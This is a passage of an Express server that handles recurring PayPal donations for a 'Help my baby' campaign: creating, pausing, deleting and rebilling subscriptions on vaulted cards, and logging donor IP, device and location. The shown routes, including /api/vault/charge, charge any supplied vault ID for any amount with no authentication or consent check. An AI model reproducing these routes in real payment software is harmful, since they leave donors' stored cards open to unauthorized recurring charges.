        baseAmount: finalValue,
        feeCovered: '0.00',
        paypalFee:
          captureObj?.seller_receivable_breakdown?.paypal_fee?.value || null,
        netAmount:
          captureObj?.seller_receivable_breakdown?.net_amount?.value || null,
        currency: 'USD',
        donorName: newSchedule.donorName,
        cardBrand: newSchedule.cardBrand,
        cardLast4: newSchedule.cardLast4,
        cardExpiry: newSchedule.cardExpiry,
        vaultId: newSchedule.vaultId,
        vaultStatus: newSchedule.vaultStatus,
        customerId: newSchedule.customerId,
        networkReferenceId: netRef.id || null,
        networkName: newSchedule.networkName,
        processorResponseCode:
          captureObj?.processor_response?.response_code || '0000',
        visitorId: visitor.id,
        ipAddress: clientInfo.ipAddress,
        location: newSchedule.location,
        device: clientInfo.device,
        capiMeta: 'ADMIN',
        capiTiktok: 'ADMIN',
        createdAt: captureObj.create_time || nowIso,
      };

      store.schedules.unshift(newSchedule);
      store.transactions.unshift(txRecord);
      saveStore(store);

      JourneyLog.system(
        '✅',
        `Created subscription ${scheduleId} (${fmtCurrency(
          finalValue
        )}/${cleanFreq}) · vault:${newSchedule.vaultId}`
      );

      return res.json({
        ok: true,
        schedule: newSchedule,
        transaction: txRecord,
      });
    }

    // Mode B: Create Subscription from an existing PayPal Vault v3 Token ID
    const cleanVaultId = String(vaultId || '').trim();
    if (!cleanVaultId) {
      return res.status(400).json({
        error:
          'Provide either an existing PayPal Vault Token ID or card details to vault a new card.',
      });
    }

    const existingSchedule = store.schedules.find(
      (s) => s.vaultId === cleanVaultId
    );
    const scheduleId = `SCHED-${Date.now()}`;
    const newSchedule = {
      scheduleId,
      status: 'ACTIVE',
      vaultId: cleanVaultId,
      vaultStatus: 'VAULTED',
      customerId: existingSchedule?.customerId || `cust_${Date.now()}`,
      donorName:
        donorName.trim() ||
        existingSchedule?.donorName ||
        'Generous Supporter',
      donorEmail: donorEmail || existingSchedule?.donorEmail || null,
      visitorId: existingSchedule?.visitorId || visitor.id,
      ipAddress: existingSchedule?.ipAddress || clientInfo.ipAddress,
      location:
        existingSchedule?.location ||
        JourneyLog.formatLocation(visitor) ||
        'Dashboard Admin',
      device: existingSchedule?.device || clientInfo.device,
      frequency: cleanFreq,
      amount: finalValue,
      currency: 'USD',
      cardBrand: existingSchedule?.cardBrand || cardBrand || 'VISA',
      cardLast4: existingSchedule?.cardLast4 || cardLast4 || '1111',
      cardExpiry: existingSchedule?.cardExpiry || cardExpiry || '2028-12',
      initialOrderId: existingSchedule?.initialOrderId || null,
      initialCaptureId: existingSchedule?.initialCaptureId || null,
      lastNetworkReferenceId:
        existingSchedule?.lastNetworkReferenceId || null,
      networkName: existingSchedule?.networkName || cardBrand || 'VISA',
      notes,
      createdAt: nowIso,
      lastBilledAt: chargeImmediately ? nowIso : null,
      rebillCount: 0,
    };

    store.schedules.unshift(newSchedule);
    saveStore(store);

    JourneyLog.system(
      '✅',
      `Registered subscription ${scheduleId} on vault:${cleanVaultId} (${fmtCurrency(
        finalValue
      )}/${cleanFreq})`
    );

    return res.json({ ok: true, schedule: newSchedule });
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }
});

// Update / Pause / Resume / Cancel a Subscription
app.patch('/api/subscriptions/:scheduleId', (req, res) => {
  try {
    const { scheduleId } = req.params;
    const { amount, frequency, donorName, donorEmail, status, notes } =
      req.body || {};

    const store = loadStore();
    const sub = store.schedules.find((s) => s.scheduleId === scheduleId);
    if (!sub) {
      return res.status(404).json({ error: 'Subscription not found.' });
    }

    if (amount !== undefined) {
      sub.amount = computeFinalAmount(amount, false);
    }
    if (frequency === 'WEEK' || frequency === 'MONTH') {
      sub.frequency = frequency;
    }
    if (donorName !== undefined) {
      sub.donorName = String(donorName).trim() || 'Generous Supporter';
    }
    if (donorEmail !== undefined) {
      sub.donorEmail = donorEmail ? String(donorEmail).trim() : null;
    }
    if (
      status &&
      ['ACTIVE', 'PAUSED', 'CANCELLED'].includes(status.toUpperCase())
    ) {
      sub.status = status.toUpperCase();
    }
    if (notes !== undefined) {
      sub.notes = String(notes);
    }

    saveStore(store);
    JourneyLog.system(
      '🔁',
      `Updated subscription ${scheduleId} → ${sub.status || 'ACTIVE'} · $${
        sub.amount
      }/${sub.frequency}`
    );

    return res.json({ ok: true, schedule: sub });
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }
});

// Remove / Delete a Subscription
app.delete('/api/subscriptions/:scheduleId', (req, res) => {
  const { scheduleId } = req.params;
  const store = loadStore();
  const idx = store.schedules.findIndex((s) => s.scheduleId === scheduleId);
  if (idx === -1) {
    return res.status(404).json({ error: 'Subscription not found.' });
  }
  const [removed] = store.schedules.splice(idx, 1);
  saveStore(store);
  JourneyLog.system(
    '🗑️',
    `Removed subscription ${scheduleId} (${removed.donorName} · vault:${removed.vaultId})`
  );
  return res.json({ ok: true, removed });
});

// Charge a previously vaulted card token for subsequent Weekly/Monthly cycles (MIT / Reference Transaction)
app.post('/api/vault/charge', async (req, res) => {
  const clientInfo = getClientInfo(req);
  const { visitor } = getOrCreateVisitor(
    clientInfo.ipAddress,
    clientInfo.clientLocation,
    clientInfo.userAgent
  );

  try {
    const {
      scheduleId,
      vaultId,
      amount,
      frequency = 'WEEK',
      previousNetworkReferenceId,
      networkName,
    } = req.body || {};

    const store = loadStore();
    const matchedSchedule = store.schedules.find(
      (s) =>
        (scheduleId && s.scheduleId === scheduleId) ||
        (vaultId && s.vaultId === vaultId)
    );

    const targetVaultId = vaultId || matchedSchedule?.vaultId;
    if (!targetVaultId) {
      return res.status(400).json({ error: 'vaultId is required.' });
    }

    const rawAmt = amount || matchedSchedule?.amount || '1.00';
    const finalValue = computeFinalAmount(rawAmt, false);
    const targetFreq = matchedSchedule?.frequency || frequency;
    const prevNetId =
      previousNetworkReferenceId ||
      matchedSchedule?.lastNetworkReferenceId ||
      null;
    const prevNetBrand =
      networkName ||
      matchedSchedule?.networkName ||
      matchedSchedule?.cardBrand ||
      'VISA';

    const accessToken = await getAccessToken();

    const storedCredential = {
      payment_initiator: 'MERCHANT',
      payment_type: 'RECURRING',
      usage: 'SUBSEQUENT',
    };
    if (prevNetId) {
      storedCredential.previous_network_transaction_reference = {
        id: prevNetId,
        network: prevNetBrand,
      };
    }

    const response = await fetch(`${PAYPAL_API_BASE}/v2/checkout/orders`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
        'PayPal-Request-Id': `mit-${targetVaultId}-${Date.now()}`,
      },
      body: JSON.stringify({
        intent: 'CAPTURE',
        purchase_units: [
          {
            description: `${
              targetFreq === 'WEEK' ? 'Weekly' : 'Monthly'
            } Recurring Donation Renewal - Help my baby`,
            custom_id: `REBILL_HELP_MY_BABY_${targetFreq}`,
            amount: {
              currency_code: 'USD',
              value: finalValue,
            },
          },
        ],
        payment_source: {
          card: {
            vault_id: targetVaultId,
            stored_credential: storedCredential,
          },
        },
      }),
    });

    const data = await response.json();
    if (!response.ok) {
      const errMsg =
        data?.details?.[0]?.description ||
        data?.message ||
        'Failed to charge vaulted card.';
      JourneyLog.decline(
        visitor,
        `MIT rebill failed (${targetVaultId}): ${errMsg}`,
        `${visitor.country}:REBILL_FAIL`
      );
      return res.status(response.status).json({
        error: errMsg,
        details: data,
      });
    }

    const captureObj = data?.purchase_units?.[0]?.payments?.captures?.[0] || {};
    const cardObj = data?.payment_source?.card || {};
    const netRef = captureObj?.network_transaction_reference || {};
    const nowIso = new Date().toISOString();

    if (matchedSchedule) {
      matchedSchedule.lastBilledAt = captureObj.create_time || nowIso;
      matchedSchedule.rebillCount = (matchedSchedule.rebillCount || 0) + 1;
      if (netRef.id) {
        matchedSchedule.lastNetworkReferenceId = netRef.id;
      }
    }

    const resolvedDonorName =
      matchedSchedule?.donorName || 'Generous Supporter';

    const rebillTx = {
      txId: `TX-${Date.now()}`,
      type: 'REBILL',
      scheduleId: matchedSchedule?.scheduleId || scheduleId || null,
      orderId: data.id,
      captureId: captureObj.id || data.id,
      status: captureObj.status || data.status || 'COMPLETED',
      frequency: targetFreq,
      amount: captureObj?.amount?.value || finalValue,
      paypalFee:
        captureObj?.seller_receivable_breakdown?.paypal_fee?.value || null,
      netAmount:
        captureObj?.seller_receivable_breakdown?.net_amount?.value || null,
      currency: 'USD',
      donorName: resolvedDonorName,
      cardBrand: cardObj.brand || matchedSchedule?.cardBrand || 'VISA',
      cardLast4: cardObj.last_digits || matchedSchedule?.cardLast4 || '1111',
      cardExpiry: cardObj.expiry || matchedSchedule?.cardExpiry || '',
      vaultId: targetVaultId,
      vaultStatus: 'VAULTED',
      customerId: matchedSchedule?.customerId || visitor.id,
      networkReferenceId: netRef.id || null,
      networkName: netRef.network || prevNetBrand,
      processorResponseCode:
        captureObj?.processor_response?.response_code || '0000',
      visitorId: matchedSchedule?.visitorId || visitor.id,
      ipAddress: clientInfo.ipAddress,
      location:
        matchedSchedule?.location ||
        JourneyLog.formatLocation(visitor) ||
        'Local (DEV)',
      device: clientInfo.device,
      capiMeta: 'SKIP(renewal)',
      capiTiktok: 'SKIP(renewal)',
      createdAt: captureObj.create_time || nowIso,
    };

    store.transactions.unshift(rebillTx);
    saveStore(store);

    JourneyLog.paymentEvent(
      visitor,
      'rebill_charged',
      `${fmtCurrency(rebillTx.amount)} (${
        targetFreq === 'WEEK' ? 'Weekly' : 'Monthly'
      }) · ${rebillTx.cardBrand} ••${rebillTx.cardLast4} · vault:${targetVaultId} → Capture ${
        rebillTx.captureId
      }`
    );

    return res.json({
      ok: true,
      transaction: rebillTx,
      schedule: matchedSchedule || null,
      rawPayPalOrder: data,
    });
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }
});

app.listen(PORT, async () => {
  const trackingConfig = getTrackingConfig();
  let trackingStatus = 'DISABLED';
  if (trackingConfig.enabled) {
    const platforms = [];
    if (trackingConfig.fbPixelId)
      platforms.push(`Meta (${trackingConfig.fbPixelId})`);
    if (trackingConfig.tiktokPixelId) platforms.push('TikTok');
    trackingStatus = platforms.join(' + ') + ' [ENABLED]';
  }
  JourneyLog.startup(
    PORT,
    ACTIVE_CAMPAIGN,
    'USD ($)',
    'English (en)',
    trackingStatus
  );
  try {
    await getAccessToken();
    JourneyLog.system(
      '✅',
      `PayPal credentials verified at boot (${PAYPAL_MODE} mode)`
    );
  } catch (err) {
    JourneyLog.system('💥', `PayPal boot health check FAILED: ${err.message}`);
  }
});
